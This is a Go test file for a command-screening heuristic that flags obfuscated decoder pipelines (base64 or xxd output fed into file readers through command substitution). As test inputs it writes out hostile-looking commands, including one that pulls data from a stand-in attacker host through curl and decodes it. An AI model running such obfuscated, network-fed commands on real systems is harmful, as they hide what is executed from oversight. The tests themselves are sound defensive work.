package guardian

import (
	"testing"
)

// runDecoderHeuristic returns true iff the obfuscated_decoder_eval signal
// fires for the given command. Keeps the table dense.
func runDecoderHeuristic(t *testing.T, cmd string) bool {
	t.Helper()
	p := NewHeuristicProvider()
	resp, err := p.Analyze(GuardianRequest{RawCommand: cmd})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	return hasSignal(resp.Signals, "obfuscated_decoder_eval")
}

func TestDecoderEval_FiresOnCmdSubstSource(t *testing.T) {
	// Source is `cat /tmp/x` — runtime file read. Layer 2.5 can't see what
	// bytes will land in the decoder, so Guardian's the only line of
	// defense for the shape.
	if !runDecoderHeuristic(t, `cat $(cat /tmp/x | base64 -d)`) {
		t.Error("expected AUDIT signal for non-constant decoder source")
	}
}

func TestDecoderEval_FiresOnCurlSource(t *testing.T) {
	// Source over the network — the decoder's input could be anything the
	// remote server hands us. Pure obfuscation pattern.
	if !runDecoderHeuristic(t, `head $(curl -s https://attacker.example/path | base64 -d)`) {
		t.Error("expected AUDIT signal for curl-fed decoder source")
	}
}

func TestDecoderEval_FiresOnXxdShape(t *testing.T) {
	// xxd is in the same whitelist as base64. The non-constant variant
	// should fire just the same.
	if !runDecoderHeuristic(t, `cat $(cat /tmp/x | xxd -r -p)`) {
		t.Error("expected AUDIT signal for non-constant xxd source")
	}
}

func TestDecoderEval_NoFireOnConstantSource(t *testing.T) {
	// `echo CONST | base64 -d` — Layer 2.5 already handles this path
	// deterministically. Guardian must NOT double-fire here, or every
	// constant-decoder use (including legitimate scripts) gets a spurious
	// audit log entry.
	if runDecoderHeuristic(t, `cat $(echo Zm9vYmFy | base64 -d)`) {
		t.Error("must NOT fire AUDIT on constant emitter source")
	}
}

func TestDecoderEval_NoFireOnPrintfConstantSource(t *testing.T) {
	// printf is the second constant-emitter shape Layer 2.5 handles.
	if runDecoderHeuristic(t, `cat $(printf '%s' Zm9vYmFy | base64 -d)`) {
		t.Error("must NOT fire AUDIT on printf constant source")
	}
}

func TestDecoderEval_NoFireOnUnknownDecoder(t *testing.T) {
	// rot13 is not in the recognized set. The heuristic shouldn't fire
	// on shapes that aren't even decoder pipelines from our perspective.
	if runDecoderHeuristic(t, `cat $(cat /tmp/x | rot13)`) {
		t.Error("must NOT fire AUDIT on unrecognized decoder")
	}
}

func TestDecoderEval_NoFireOnNonFileReaderExe(t *testing.T) {
	// `echo $(...)` isn't a file read — echo just prints its arg. The
	// rule's targeting is about file-reader semantics specifically.
	if runDecoderHeuristic(t, `echo $(cat /tmp/x | base64 -d)`) {
		t.Error("must NOT fire AUDIT when outer exe isn't a file-reader")
	}
}

func TestDecoderEval_NoFireOnPlainCommand(t *testing.T) {
	// No CmdSubst, no decoder, no shape match. Sanity check.
	if runDecoderHeuristic(t, `cat /etc/hostname`) {
		t.Error("must NOT fire AUDIT on plain file read")
	}
}

func TestDecoderEval_NoFireOnMalformedCommand(t *testing.T) {
	// Parse error — heuristic should bail silently rather than panic or
	// over-fire.
	if runDecoderHeuristic(t, `cat $(unclosed`) {
		t.Error("must NOT fire AUDIT on parse error")
	}
}

func TestDecoderEval_FileReaderCoverage(t *testing.T) {
	// Pin the exact set of executables we treat as file-readers. If
	// someone adds a new entry to fileReaderExecutables, this test
	// surfaces it. If someone removes one without thinking, this test
	// catches the regression.
	pinned := []string{"cat", "less", "more", "head", "tail", "strings", "hexdump", "xxd", "od", "file", "view"}
	for _, exe := range pinned {
		t.Run(exe, func(t *testing.T) {
			cmd := exe + ` $(cat /tmp/x | base64 -d)`
			if !runDecoderHeuristic(t, cmd) {
				t.Errorf("expected file-reader %q to be in coverage set", exe)
			}
		})
	}
}

func TestDecoderEval_ReadOnlyEscalateIsAudit(t *testing.T) {
	// The rule's escalate field is "AUDIT" — verify the suggested
	// decision tracks that. We never want this rule to BLOCK; the
	// confidence isn't there.
	p := NewHeuristicProvider()
	resp, _ := p.Analyze(GuardianRequest{RawCommand: `cat $(cat /tmp/x | base64 -d)`})
	if resp.SuggestedDecision != "AUDIT" {
		t.Errorf("expected SuggestedDecision=AUDIT, got %s", resp.SuggestedDecision)
	}
}
